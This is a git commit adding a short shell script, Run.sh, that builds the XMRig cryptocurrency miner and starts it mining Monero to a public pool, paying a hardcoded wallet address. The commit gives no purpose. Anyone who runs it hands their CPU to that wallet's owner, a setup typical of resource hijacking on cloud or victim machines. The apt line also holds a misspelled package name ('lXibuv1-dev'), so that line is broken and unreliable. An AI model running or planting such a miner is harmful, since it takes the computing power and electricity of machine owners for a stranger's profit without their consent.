5687457f95cf25b5d04f039f8f4ff5b87588460a
Parmar Parth <84669955+Code-Parth@users.noreply.github.com>
2022-05-17 10:27:39 +0530

    Add files via upload

---
+++ Run.sh
@@ -0,0 +1,17 @@
+sudo apt-get update -y
+
+sudo apt install git build-essential cmake lXibuv1-dev libssl-dev libhwloc-dev -y
+
+git clone https://github.com/xmrig/xmrig.git
+
+cd xmrig
+
+mkdir build
+
+cd build
+
+cmake ..
+
+make
+
+./xmrig -o gulf.moneroocean.stream:10128 -u 49SxFJoRJtRJXBv2a7PTnaeDkmwryMoBnVWupE2AdFNPUuxStXptETnB2qHMj5xfi1B6PFQk3Dfb99w2FtUYq33QGQpqcm8
